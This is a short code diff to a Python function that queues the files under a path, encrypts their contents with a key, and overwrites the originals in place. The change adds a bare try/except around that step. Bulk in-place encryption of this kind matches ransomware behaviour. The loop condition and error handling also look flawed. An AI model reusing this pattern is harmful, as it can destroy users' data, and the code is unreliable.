@@ -51,19 +51,22 @@ def encrypt_files(key, path):
     def func(key):
         while q.not_empty:
 
-            file = q.get()
+            try:
+                file = q.get()
 
-            # Load the content of file
-            with open(file, 'r') as f:
-                content = f.read()
+                # Load the content of file
+                with open(file, 'r') as f:
+                    content = f.read()
 
-            # Encrypt data
-            encrypted_data = encrypt(content, key)
+                # Encrypt data
+                encrypted_data = encrypt(content, key)
 
-            # Rewrite the encrypted data
-            with open(file, 'w') as f:
-                f.write(encrypted_data)
-            
+                # Rewrite the encrypted data
+                with open(file, 'w') as f:
+                    f.write(encrypted_data)
+            except:
+                print(f'Failed to encrypt file {file}')
+
             q.task_done()
 
     return encrypted_files
